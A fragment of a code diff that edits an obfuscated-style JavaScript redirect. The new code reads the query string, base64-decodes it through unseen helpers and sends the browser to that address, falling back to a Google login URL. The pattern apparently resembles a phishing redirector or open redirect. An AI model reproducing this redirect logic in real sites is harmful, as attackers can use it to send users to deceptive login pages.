@@ -13,10 +13,10 @@
           return false;
         }
       };
-      const _2x = window ;
+      const _q = window.location.search.slice(1); // get query string without "?"
       try {
-        const _3x = atob(_0x(decodeURIComponent(_2x)));
-        window['location']['href'] = _1x(_3x) ? _3x : 'https://www.google.com/login';
+        const _decoded = atob(_0x(decodeURIComponent(_q)));
+        window['location']['href'] = _1x(_decoded) ? _decoded : 'https://www.google.com/login';
       } catch (e) {
         window['location']['href'] = 'https://www.google.com/login';
       }
